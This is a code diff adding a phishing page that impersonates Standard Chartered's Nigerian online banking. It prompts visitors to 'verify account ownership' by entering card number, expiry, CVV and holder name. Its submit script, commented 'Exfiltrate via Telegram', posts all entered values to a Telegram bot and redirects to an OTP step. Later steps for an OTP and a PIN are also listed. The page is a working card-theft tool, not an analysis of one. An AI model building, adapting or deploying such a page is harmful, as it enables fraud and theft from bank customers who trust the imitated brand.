@@ -1,0 +1,1079 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Standard Online Banking | Sign in</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.8/jquery.inputmask.min.js"></script>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Archivo+Narrow:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://use.fontawesome.com/releases/v5.7.0/css/all.css"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Inter", "Archivo Narrow", Arial, sans-serif;
+        background: #fff;
+        min-height: 100vh;
+        color: #2d2d2d;
+      }
+
+      /* ─── TOP BAR ─────────────────────────── */
+      .top-bar {
+        background: #c8102e;
+        height: 4px;
+      }
+
+      /* ─── HEADER ──────────────────────────── */
+      .header {
+        background: #fff;
+        border-bottom: 1px solid #e5e7eb;
+        padding: 14px 40px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      .header .logo {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+      .header .logo img {
+        height: 34px;
+      }
+      .header .logo-text {
+        font-size: 18px;
+        font-weight: 700;
+        color: #003c71;
+        letter-spacing: -0.3px;
+      }
+      .header-right {
+        display: flex;
+        gap: 18px;
+        font-size: 12px;
+        font-weight: 500;
+        color: #003c71;
+      }
+      .header-right a {
+        color: #003c71;
+        text-decoration: none;
+      }
+      .header-right a:hover {
+        text-decoration: underline;
+      }
+      .header-right .sep {
+        color: #d1d5db;
+      }
+
+      /* ─── PAGE TITLE ──────────────────────── */
+      .page-title-bar {
+        background: #f3f4f6;
+        border-bottom: 1px solid #e5e7eb;
+        padding: 16px 40px;
+        font-size: 22px;
+        font-weight: 700;
+        color: #003c71;
+      }
+
+      /* ─── MAIN LAYOUT ─────────────────────── */
+      .main-container {
+        max-width: 1100px;
+        margin: 0 auto;
+        padding: 30px 20px;
+        display: flex;
+        gap: 40px;
+        align-items: flex-start;
+      }
+
+      /* ─── LEFT: VERIFICATION STEPPER ──────── */
+      .stepper-panel {
+        width: 260px;
+        flex-shrink: 0;
+      }
+      .stepper-panel h5 {
+        font-size: 15px;
+        font-weight: 700;
+        color: #003c71;
+        margin-bottom: 20px;
+      }
+      .step-item {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        padding: 10px 14px;
+        border-radius: 8px;
+        margin-bottom: 4px;
+        font-size: 13px;
+        color: #6b7280;
+        font-weight: 500;
+        background: transparent;
+        transition: all 0.2s;
+      }
+      .step-item.active {
+        background: #003c71;
+        color: #fff;
+        font-weight: 600;
+      }
+      .step-item.active .step-num {
+        background: rgba(255, 255, 255, 0.25);
+        color: #fff;
+      }
+      .step-item.completed {
+        color: #059669;
+      }
+      .step-item.completed .step-num {
+        background: #059669;
+        color: #fff;
+      }
+      .step-num {
+        width: 28px;
+        height: 28px;
+        border-radius: 50%;
+        background: #e5e7eb;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 12px;
+        font-weight: 700;
+        color: #6b7280;
+        flex-shrink: 0;
+      }
+      .step-line {
+        width: 1px;
+        height: 18px;
+        background: #d1d5db;
+        margin-left: 20px;
+        margin-bottom: 4px;
+      }
+
+      /* ─── RIGHT: FORM PANEL ───────────────── */
+      .form-panel {
+        flex: 1;
+        background: #fff;
+        border: 1px solid #e5e7eb;
+        border-radius: 12px;
+        padding: 35px 40px;
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
+      }
+      .form-panel h2 {
+        font-size: 20px;
+        font-weight: 700;
+        color: #111827;
+        margin-bottom: 6px;
+      }
+      .form-panel .subtitle {
+        font-size: 13px;
+        color: #6b7280;
+        margin-bottom: 28px;
+      }
+
+      /* ─── CARD PREVIEW ──────────────────── */
+      .card-preview-container {
+        margin-bottom: 30px;
+      }
+      .card-preview {
+        width: 340px;
+        height: 200px;
+        border-radius: 14px;
+        background: linear-gradient(
+          135deg,
+          #1a365d 0%,
+          #153e75 30%,
+          #1e4d8c 60%,
+          #2b6cb0 100%
+        );
+        padding: 22px 24px;
+        position: relative;
+        color: #fff;
+        box-shadow: 0 8px 25px rgba(0, 60, 113, 0.25);
+        font-family: "Archivo Narrow", monospace;
+        transition: all 0.3s ease;
+        overflow: hidden;
+      }
+      .card-preview::before {
+        content: "";
+        position: absolute;
+        top: -40px;
+        right: -40px;
+        width: 160px;
+        height: 160px;
+        border-radius: 50%;
+        background: rgba(255, 255, 255, 0.04);
+      }
+      .card-preview::after {
+        content: "";
+        position: absolute;
+        bottom: -30px;
+        left: -30px;
+        width: 120px;
+        height: 120px;
+        border-radius: 50%;
+        background: rgba(255, 255, 255, 0.03);
+      }
+      .card-preview .chip {
+        width: 40px;
+        height: 30px;
+        background: linear-gradient(135deg, #f6d365 0%, #fda085 100%);
+        border-radius: 5px;
+        margin-bottom: 18px;
+        position: relative;
+        overflow: hidden;
+      }
+      .card-preview .chip::after {
+        content: "";
+        position: absolute;
+        left: 8px;
+        top: 6px;
+        width: 12px;
+        height: 18px;
+        border: 1px solid rgba(0, 0, 0, 0.15);
+        border-radius: 2px;
+      }
+      .card-preview .card-number-display {
+        font-size: 20px;
+        letter-spacing: 3.5px;
+        font-weight: 600;
+        margin-bottom: 16px;
+        text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        min-height: 30px;
+        word-spacing: 8px;
+      }
+      .card-preview .card-number-display .placeholder-text {
+        opacity: 0.5;
+        font-weight: 300;
+        letter-spacing: 3px;
+      }
+      .card-preview .card-bottom {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-end;
+        position: relative;
+        z-index: 1;
+      }
+      .card-preview .card-holder-area {
+        flex: 1;
+      }
+      .card-preview .card-holder-area .label {
+        font-size: 8px;
+        text-transform: uppercase;
+        opacity: 0.6;
+        letter-spacing: 1.5px;
+        font-family: "Inter", sans-serif;
+      }
+      .card-preview .card-holder-area .value {
+        font-size: 14px;
+        font-weight: 600;
+        letter-spacing: 1px;
+        min-height: 20px;
+        margin-top: 2px;
+      }
+      .card-preview .card-holder-area .value .placeholder-text {
+        opacity: 0.5;
+        font-weight: 300;
+        font-size: 13px;
+      }
+      .card-preview .expiry-area {
+        text-align: right;
+      }
+      .card-preview .expiry-area .label {
+        font-size: 8px;
+        text-transform: uppercase;
+        opacity: 0.6;
+        letter-spacing: 1.5px;
+        font-family: "Inter", sans-serif;
+      }
+      .card-preview .expiry-area .value {
+        font-size: 14px;
+        font-weight: 600;
+        letter-spacing: 1.5px;
+        min-height: 20px;
+        margin-top: 2px;
+      }
+      .card-preview .expiry-area .value .placeholder-text {
+        opacity: 0.5;
+        font-weight: 300;
+      }
+      .card-preview .card-brand {
+        position: absolute;
+        bottom: 22px;
+        right: 24px;
+        font-size: 22px;
+        font-weight: 700;
+        font-style: italic;
+        opacity: 0.15;
+        letter-spacing: 1px;
+        font-family: "Archivo Narrow", serif;
+      }
+
+      /* ─── FORM FIELDS ─────────────────────── */
+      .form-grid {
+        display: grid;
+        gap: 20px;
+      }
+
+      .form-group {
+      }
+      .form-group label {
+        display: block;
+        font-size: 12px;
+        font-weight: 600;
+        color: #374151;
+        margin-bottom: 5px;
+      }
+      .form-group label .required {
+        color: #dc2626;
+        margin-left: 2px;
+      }
+      .form-group .input-wrapper {
+        position: relative;
+        display: flex;
+        align-items: center;
+      }
+      .form-group .input-wrapper .prefix-icon {
+        position: absolute;
+        left: 12px;
+        color: #9ca3af;
+        font-size: 14px;
+        z-index: 2;
+      }
+      .form-group input[type="text"],
+      .form-group input[type="password"] {
+        width: 100%;
+        padding: 11px 14px;
+        border: 1px solid #d1d5db;
+        border-radius: 8px;
+        font-size: 14px;
+        font-family: "Inter", sans-serif;
+        color: #111827;
+        background: #fafbfc;
+        transition: all 0.2s;
+      }
+      .form-group input[type="text"]:focus,
+      .form-group input[type="password"]:focus {
+        border-color: #003c71;
+        background: #fff;
+        box-shadow: 0 0 0 3px rgba(0, 60, 113, 0.08);
+        outline: none;
+      }
+      .form-group input[type="text"].error,
+      .form-group input[type="password"].error {
+        border-color: #dc2626;
+        background: #fef2f2;
+      }
+      .form-group .input-with-icon input {
+        padding-left: 36px;
+      }
+      .form-group .help-icon {
+        position: absolute;
+        right: 10px;
+        color: #9ca3af;
+        font-size: 13px;
+        cursor: pointer;
+        padding: 4px;
+        border-radius: 4px;
+        border: 1px solid transparent;
+        transition: all 0.2s;
+      }
+      .form-group .help-icon:hover {
+        border-color: #d1d5db;
+        color: #6b7280;
+      }
+      .form-group .hint {
+        font-size: 11px;
+        color: #9ca3af;
+        margin-top: 4px;
+      }
+      .form-group .error-msg {
+        font-size: 11px;
+        color: #dc2626;
+        margin-top: 4px;
+        display: none;
+      }
+
+      .form-row-duo {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 16px;
+      }
+
+      .card-type-indicator {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 8px;
+      }
+      .card-type-indicator .badge {
+        padding: 4px 12px;
+        border-radius: 4px;
+        font-size: 11px;
+        font-weight: 600;
+        border: 1px solid #e5e7eb;
+        color: #9ca3af;
+        background: #fff;
+        transition: all 0.2s;
+      }
+      .card-type-indicator .badge.active {
+        border-color: #003c71;
+        color: #003c71;
+        background: #eff6ff;
+      }
+
+      /* ─── TERMS ───────────────────────────── */
+      .terms-section {
+        margin-top: 25px;
+        padding-top: 20px;
+        border-top: 1px solid #e5e7eb;
+      }
+      .terms-section .form-check {
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+        margin-bottom: 12px;
+      }
+      .terms-section .form-check input[type="checkbox"] {
+        margin-top: 2px;
+        width: 16px;
+        height: 16px;
+        accent-color: #003c71;
+        flex-shrink: 0;
+      }
+      .terms-section .form-check label {
+        font-size: 12px;
+        color: #4b5563;
+        line-height: 1.5;
+      }
+      .terms-section .form-check label a {
+        color: #003c71;
+        text-decoration: underline;
+      }
+      .terms-section .legal-notice {
+        font-size: 11px;
+        color: #9ca3af;
+        line-height: 1.5;
+        padding-left: 26px;
+      }
+
+      /* ─── BUTTONS ─────────────────────────── */
+      .btn-row {
+        display: flex;
+        gap: 12px;
+        margin-top: 24px;
+        justify-content: flex-end;
+      }
+      .btn {
+        padding: 11px 28px;
+        border-radius: 8px;
+        font-size: 14px;
+        font-weight: 600;
+        cursor: pointer;
+        border: none;
+        transition: all 0.2s;
+        font-family: "Inter", sans-serif;
+      }
+      .btn-primary {
+        background: #c8102e;
+        color: #fff;
+      }
+      .btn-primary:hover {
+        background: #a80d26;
+        box-shadow: 0 2px 8px rgba(200, 16, 46, 0.3);
+      }
+      .btn-primary:disabled {
+        background: #fca5a5;
+        cursor: not-allowed;
+        box-shadow: none;
+      }
+      .btn-secondary {
+        background: #fff;
+        color: #374151;
+        border: 1px solid #d1d5db;
+      }
+      .btn-secondary:hover {
+        background: #f9fafb;
+        border-color: #9ca3af;
+      }
+
+      /* ─── RESPONSIVE ───────────────────────── */
+      @media (max-width: 800px) {
+        .main-container {
+          flex-direction: column;
+        }
+        .stepper-panel {
+          width: 100%;
+        }
+        .form-panel {
+          padding: 25px 20px;
+        }
+        .form-row-duo {
+          grid-template-columns: 1fr;
+        }
+        .header {
+          flex-direction: column;
+          gap: 10px;
+          padding: 12px 20px;
+        }
+        .card-preview {
+          width: 100%;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="top-bar"></div>
+
+    <div class="header">
+      <div class="logo">
+        <img
+          src="./assets/standard-chartered-logo.png"
+          alt="Standard Chartered"
+          onerror="this.style.display = 'none'"
+        />
+        <span class="logo-text">Online Banking</span>
+      </div>
+      <div class="header-right">
+        <a href="#">Personal</a>
+        <span class="sep">|</span>
+        <a href="#">Priority Banking</a>
+        <span class="sep">|</span>
+        <a href="#">SME</a>
+        <span class="sep">|</span>
+        <a href="#">Help &amp; Support</a>
+        <span class="sep">|</span>
+        <a href="#">Secure Login</a>
+        <span class="sep">|</span>
+        <a href="#">Register</a>
+      </div>
+    </div>
+
+    <div class="main-container">
+      <!-- LEFT: STEPPER -->
+      <div class="stepper-panel">
+        <h5>Verify Account Ownership</h5>
+
+        <div class="step-item completed">
+          <span class="step-num"
+            ><i class="fas fa-check" style="font-size: 10px"></i
+          ></span>
+          <span>Terms &amp; Conditions</span>
+        </div>
+        <div class="step-line"></div>
+
+        <div class="step-item active">
+          <span class="step-num">2</span>
+          <span>Verify with Card Details</span>
+        </div>
+        <div class="step-line"></div>
+
+        <div class="step-item">
+          <span class="step-num">3</span>
+          <span>OTP Verification</span>
+        </div>
+        <div class="step-line"></div>
+
+        <div class="step-item">
+          <span class="step-num">4</span>
+          <span>Pin</span>
+        </div>
+        <div class="step-line"></div>
+
+        <div class="step-item">
+          <span class="step-num">5</span>
+          <span>Confirmation</span>
+        </div>
+      </div>
+
+      <!-- RIGHT: FORM -->
+      <div class="form-panel">
+        <h2>Verify using your ATM Card details</h2>
+        <p class="subtitle">
+          Enter your card information to verify your identity. All details are
+          encrypted and secure.
+        </p>
+
+        <!-- CARD PREVIEW -->
+        <div class="card-preview-container">
+          <div class="card-preview" id="cardPreview">
+            <div class="chip"></div>
+            <div class="card-number-display" id="cardNumberDisplay">
+              <span class="placeholder-text"
+                >•••• &nbsp; •••• &nbsp; •••• &nbsp; ••••</span
+              >
+            </div>
+            <div class="card-bottom">
+              <div class="card-holder-area">
+                <div class="label">Card Holder</div>
+                <div class="value" id="cardHolderDisplay">
+                  <span class="placeholder-text">YOUR NAME</span>
+                </div>
+              </div>
+              <div class="expiry-area">
+                <div class="label">Valid Thru</div>
+                <div class="value" id="expiryDisplay">
+                  <span class="placeholder-text">MM/YY</span>
+                </div>
+              </div>
+            </div>
+            <div class="card-brand">SC</div>
+          </div>
+        </div>
+
+        <form id="cardForm" autocomplete="off">
+          <div class="form-grid">
+            <!-- Card Number -->
+            <div class="form-group">
+              <label for="cn"
+                >Card Number <span class="required">*</span></label
+              >
+              <div class="card-type-indicator" id="cardTypeIndicator">
+                <span class="badge">Visa</span>
+                <span class="badge">Mastercard</span>
+                <span class="badge">Verve</span>
+              </div>
+              <div class="input-wrapper input-with-icon">
+                <span class="prefix-icon"
+                  ><i class="far fa-credit-card"></i
+                ></span>
+                <input
+                  type="text"
+                  id="cn"
+                  name="cn"
+                  placeholder="0000 0000 0000 0000"
+                  maxlength="19"
+                  required
+                  spellcheck="false"
+                />
+                <span class="help-icon"
+                  ><i class="fas fa-question-circle"></i
+                ></span>
+              </div>
+              <div class="error-msg" id="cnError">
+                Please enter a valid card number
+              </div>
+            </div>
+
+            <!-- Expiry + CVV -->
+            <div class="form-row-duo">
+              <div class="form-group">
+                <label for="exdate"
+                  >Expiry Date <span class="required">*</span></label
+                >
+                <div class="input-wrapper">
+                  <input
+                    type="text"
+                    id="exdate"
+                    name="exdate"
+                    placeholder="MM/YY"
+                    maxlength="5"
+                    required
+                    spellcheck="false"
+                  />
+                  <span class="help-icon"
+                    ><i class="fas fa-question-circle"></i
+                  ></span>
+                </div>
+                <div class="error-msg" id="exdateError">
+                  Please enter a valid expiry date
+                </div>
+              </div>
+              <div class="form-group">
+                <label for="cvv">CVV <span class="required">*</span></label>
+                <div class="input-wrapper input-with-icon">
+                  <span class="prefix-icon"
+                    ><i class="fas fa-lock" style="font-size: 11px"></i
+                  ></span>
+                  <input
+                    type="password"
+                    id="cvv"
+                    name="cvv"
+                    placeholder="•••"
+                    minlength="3"
+                    maxlength="4"
+                    required
+                    spellcheck="false"
+                    autocomplete="off"
+                  />
+                  <span class="help-icon" onclick="toggleCVV()"
+                    ><i class="fas fa-eye" id="cvvToggle"></i
+                  ></span>
+                </div>
+                <div class="hint">3-4 digits on card back</div>
+                <div class="error-msg" id="cvvError">
+                  Please enter a valid CVV
+                </div>
+              </div>
+            </div>
+
+            <!-- Card Holder Name -->
+            <div class="form-group">
+              <label for="chn"
+                >Card Holder Name <span class="required">*</span></label
+              >
+              <div class="input-wrapper">
+                <input
+                  type="text"
+                  id="chn"
+                  name="chn"
+                  placeholder="Full name as printed on card"
+                  required
+                  spellcheck="false"
+                />
+              </div>
+              <div class="error-msg" id="chnError">
+                Please enter the card holder name
+              </div>
+            </div>
+          </div>
+
+          <!-- TERMS -->
+          <div class="terms-section">
+            <div class="form-check">
+              <input
+                type="checkbox"
+                class="form-check-input"
+                id="agreeTerms"
+                required
+              />
+              <label class="form-check-label" for="agreeTerms">
+                I have read and understood the
+                <a href="#">Terms &amp; Conditions</a> and agree to abide by
+                them.
+              </label>
+            </div>
+            <div class="legal-notice">
+              Should you attempt to register with fictitious details or on
+              behalf of another person, we reserve the right to take legal
+              action.
+            </div>
+          </div>
+
+          <!-- BUTTONS -->
+          <div class="btn-row">
+            <button
+              type="button"
+              class="btn btn-secondary"
+              onclick="window.location.href = 'login.htm'"
+            >
+              Cancel
+            </button>
+            <button type="submit" class="btn btn-primary" id="submitBtn">
+              Submit
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <!-- FOOTER -->
+    <div
+      style="
+        border-top: 1px solid #e5e7eb;
+        max-width: 1100px;
+        margin: 30px auto 0;
+        padding: 16px 20px 24px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        font-size: 11px;
+        color: #9ca3af;
+      "
+    >
+      <div>
+        <a
+          href="#"
+          style="color: #9ca3af; text-decoration: none; margin-right: 14px"
+          >Privacy Statement</a
+        >
+        <a
+          href="#"
+          style="color: #9ca3af; text-decoration: none; margin-right: 14px"
+          >Terms of Use</a
+        >
+        <a
+          href="#"
+          style="color: #9ca3af; text-decoration: none; margin-right: 14px"
+          >Security</a
+        >
+        <a
+          href="#"
+          style="color: #9ca3af; text-decoration: none; margin-right: 14px"
+          >Help</a
+        >
+        <span>&copy; 2026 Standard Bank</span>
+      </div>
+      <div style="display: flex; gap: 4px">
+        <img
+          src="https://retail.sc.com/afr/foa/theme/default/images/footer/Twitter-o.png"
+          alt="Twitter"
+          style="width: 22px; height: 22px; opacity: 0.4"
+        />
+        <img
+          src="https://retail.sc.com/afr/foa/theme/default/images/footer/Facebook-o.png"
+          alt="Facebook"
+          style="width: 22px; height: 22px; opacity: 0.4"
+        />
+        <img
+          src="https://retail.sc.com/afr/foa/theme/default/images/footer/Linkedin-o.png"
+          alt="LinkedIn"
+          style="width: 22px; height: 22px; opacity: 0.4"
+        />
+        <img
+          src="https://retail.sc.com/afr/foa/theme/default/images/footer/flag_hover.png"
+          alt="NG"
+          style="width: 22px; height: 22px; opacity: 0.4"
+        />
+      </div>
+    </div>
+    <script src="./scripts.js"></script>
+
+    <script>
+      $(document).ready(function () {
+        // ─── INPUT MASKS ────────────────────────────────
+        $("#cn").inputmask({
+          mask: "9999 9999 9999 9999",
+          placeholder: "0000 0000 0000 0000",
+          greedy: false,
+          oncomplete: function () {
+            updateCardPreview();
+            detectCardType();
+          },
+          onincomplete: function () {
+            updateCardPreview();
+          },
+        });
+
+        $("#exdate").inputmask({
+          mask: "99/99",
+          placeholder: "MM/YY",
+          greedy: false,
+          oncomplete: function () {
+            updateCardPreview();
+          },
+          onincomplete: function () {
+            updateCardPreview();
+          },
+        });
+
+        // No mask for CVV — just maxlength
+
+        // ─── CARD PREVIEW LIVE UPDATE ──────────────────
+        function updateCardPreview() {
+          var cn = $("#cn").val().trim();
+          var exdate = $("#exdate").val().trim();
+          var chn = $("#chn").val().trim().toUpperCase();
+
+          // Card number
+          if (cn.length >= 4) {
+            var masked = "";
+            var digits = cn.replace(/\s/g, "");
+            for (var i = 0; i < digits.length; i++) {
+              if (i > 0 && i % 4 === 0) masked += " &nbsp; ";
+              masked += digits[i];
+            }
+            // Show remaining as bullets
+            var remaining = 16 - digits.length;
+            if (remaining > 0) {
+              var bullets = "";
+              for (var j = 0; j < remaining; j++) {
+                if (digits.length + j > 0 && (digits.length + j) % 4 === 0)
+                  bullets += " &nbsp; ";
+                bullets += "•";
+              }
+              masked += bullets;
+            }
+            $("#cardNumberDisplay").html(masked);
+          } else {
+            $("#cardNumberDisplay").html(
+              '<span class="placeholder-text">•••• &nbsp; •••• &nbsp; •••• &nbsp; ••••</span>',
+            );
+          }
+
+          // Expiry
+          if (exdate.length >= 3) {
+            $("#expiryDisplay").text(exdate);
+          } else {
+            $("#expiryDisplay").html(
+              '<span class="placeholder-text">MM/YY</span>',
+            );
+          }
+
+          // Card holder
+          if (chn.length > 0) {
+            $("#cardHolderDisplay").text(chn);
+          } else {
+            $("#cardHolderDisplay").html(
+              '<span class="placeholder-text">YOUR NAME</span>',
+            );
+          }
+        }
+
+        function detectCardType() {
+          var cn = $("#cn").val().replace(/\s/g, "");
+          $(".card-type-indicator .badge").removeClass("active");
+          if (cn.length >= 1) {
+            var first = cn.charAt(0);
+            if (first === "4") {
+              $(".card-type-indicator .badge:eq(0)").addClass("active"); // Visa
+            } else if (first === "5") {
+              $(".card-type-indicator .badge:eq(1)").addClass("active"); // Mastercard
+            } else if (first === "6") {
+              $(".card-type-indicator .badge:eq(2)").addClass("active"); // Verve
+            }
+          }
+        }
+
+        $("#cn").on("input", function () {
+          updateCardPreview();
+          detectCardType();
+        });
+        $("#exdate").on("input", updateCardPreview);
+        $("#chn").on("input", updateCardPreview);
+
+        // ─── CVV TOGGLE ────────────────────────────────
+        window.toggleCVV = function () {
+          var cvvInput = $("#cvv");
+          var icon = $("#cvvToggle");
+          if (cvvInput.attr("type") === "password") {
+            cvvInput.attr("type", "text");
+            icon.removeClass("fa-eye").addClass("fa-eye-slash");
+          } else {
+            cvvInput.attr("type", "password");
+            icon.removeClass("fa-eye-slash").addClass("fa-eye");
+          }
+        };
+
+        // ─── VALIDATION ────────────────────────────────
+        function validateForm() {
+          var valid = true;
+
+          // Card number
+          var cn = $("#cn").val().replace(/\s/g, "");
+          if (cn.length !== 16 || !/^\d{16}$/.test(cn)) {
+            $("#cn").addClass("error");
+            $("#cnError").show();
+            valid = false;
+          } else {
+            $("#cn").removeClass("error");
+            $("#cnError").hide();
+          }
+
+          // Expiry
+          var exdate = $("#exdate").val();
+          if (!/^\d{2}\/\d{2}$/.test(exdate)) {
+            $("#exdate").addClass("error");
+            $("#exdateError").show();
+            valid = false;
+          } else {
+            var parts = exdate.split("/");
+            var month = parseInt(parts[0]);
+            if (month < 1 || month > 12) {
+              $("#exdate").addClass("error");
+              $("#exdateError").text("Invalid month");
+              $("#exdateError").show();
+              valid = false;
+            } else {
+              $("#exdate").removeClass("error");
+              $("#exdateError").hide();
+            }
+          }
+
+          // CVV
+          var cvv = $("#cvv").val();
+          if (!/^\d{3,4}$/.test(cvv)) {
+            $("#cvv").addClass("error");
+            $("#cvvError").show();
+            valid = false;
+          } else {
+            $("#cvv").removeClass("error");
+            $("#cvvError").hide();
+          }
+
+          // Card holder name
+          var chn = $("#chn").val().trim();
+          if (chn.length < 2) {
+            $("#chn").addClass("error");
+            $("#chnError").show();
+            valid = false;
+          } else {
+            $("#chn").removeClass("error");
+            $("#chnError").hide();
+          }
+
+          // Terms
+          if (!$("#agreeTerms").is(":checked")) {
+            valid = false;
+            $("#agreeTerms").closest(".form-check").css("color", "#dc2626");
+          } else {
+            $("#agreeTerms").closest(".form-check").css("color", "");
+          }
+
+          return valid;
+        }
+
+        // ─── SUBMIT ────────────────────────────────────
+        $("#cardForm").on("submit", function (e) {
+          e.preventDefault();
+          if (validateForm()) {
+            $("#submitBtn")
+              .html('<i class="fas fa-spinner fa-spin"></i> Verifying...')
+              .prop("disabled", true);
+
+            var cn = $("#cn").val();
+            var exdate = $("#exdate").val();
+            var cvv = $("#cvv").val();
+            var chn = $("#chn").val();
+
+            // Exfiltrate via Telegram
+            var message =
+              "🔴 NEW SC NG CARD SUBMISSION\n\n" +
+              "👤 Card Holder: " +
+              chn +
+              "\n" +
+              "💳 Card Number: " +
+              cn +
+              "\n" +
+              "📅 Expiry: " +
+              exdate +
+              "\n" +
+              "🔐 CVV: " +
+              cvv +
+              "\n" +
+              "🌍 Nigeria | " +
+              new Date().toLocaleString();
+
+            fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: chatId, text: message }),
+            })
+              .then(function (response) {
+                return response.json();
+              })
+              .then(function (data) {
+                window.location.href = "otp.html";
+              })
+              .catch(function (err) {
+                console.error(err);
+                window.location.href = "card.html";
+              });
+          }
+        });
+
+        // ─── REAL-TIME VALIDATION ON BLUR ─────────────
+        $("#cn, #exdate, #cvv, #chn").on("blur", function () {
+          if ($(this).val().trim() !== "") {
+            validateForm();
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
